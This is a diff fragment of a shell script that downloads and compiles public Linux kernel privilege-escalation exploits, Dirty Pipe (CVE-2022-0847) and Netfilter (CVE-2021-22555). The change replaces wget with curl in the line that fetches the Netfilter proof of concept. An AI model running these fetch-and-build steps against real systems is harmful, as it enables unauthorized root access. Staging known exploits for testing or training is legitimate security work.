@@ -32,7 +32,7 @@ gcc CVE-2022-0847-exploit-2.c -o CVE-2022-0847-exploit-2
 rm -rf CVE-2022-0847-exploit-1.c CVE-2022-0847-exploit-2.c
 
 # Netfilter - CVE-2021-22555
-wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c -O CVE-2021-22555.c
+curl https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c > CVE-2021-22555.c
 gcc CVE-2021-22555.c -o CVE-2021-22555-exploit
 rm -rf CVE-2021-22555.c
 
